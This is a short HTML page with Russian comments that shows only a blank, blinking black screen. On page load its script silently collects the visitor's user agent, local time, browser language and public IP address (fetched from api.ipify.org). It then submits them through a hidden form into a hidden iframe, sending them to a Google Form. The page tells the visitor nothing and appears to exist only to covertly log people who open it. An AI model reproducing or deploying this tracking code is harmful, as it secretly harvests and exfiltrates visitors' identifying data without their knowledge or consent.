<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Name</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #000;
      margin: 0;
    }
    #status {
      font-size: 50px;
      color: #fff;
      text-align: center;
      animation: blink 1s step-end infinite;
    }

    /* Мигающий текст */
    @keyframes blink {
      50% {
        opacity: 0;
      }
    }

    /* Скрытая форма */
    #sendForm {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div id="status"></div>

  <form id="sendForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdl5lqvGofH1jMMMTi9S50FlRw-Q7Jx1cYaPMPULo9lkfxu1A/formResponse" method="POST" target="hiddenFrame">
    <input name="entry.206479093" id="combinedInput" type="text">
  </form>

  <iframe name="hiddenFrame" style="display: none;" onload="document.getElementById('status').textContent = ''"></iframe>

  <script>
    const userAgent = navigator.userAgent;
    const currentTime = new Date().toLocaleString();
    const userLanguage = navigator.language || navigator.userLanguage; // Получаем язык

    // Функция для получения IP-адреса с помощью ipify (без токена)
    function getIP() {
      return fetch('https://api.ipify.org?format=json')  // Используем публичный API ipify
        .then(response => response.json())
        .then(data => data.ip)  // Извлекаем IP-адрес
        .catch(() => 'Не удалось получить IP');
    }

    // Основной код для отправки информации
    getIP().then(ip => {
      // Объединяем информацию об устройстве, времени, языке и IP в одну строку
      const combinedInfo = `${userAgent} | ${currentTime} | Язык: ${userLanguage} | IP: ${ip}`;
      
      // Заполняем поле формы
      document.getElementById("combinedInput").value = combinedInfo;

      // Отправляем форму
      document.getElementById('sendForm').submit();
    });
  </script>
</body>
</html>
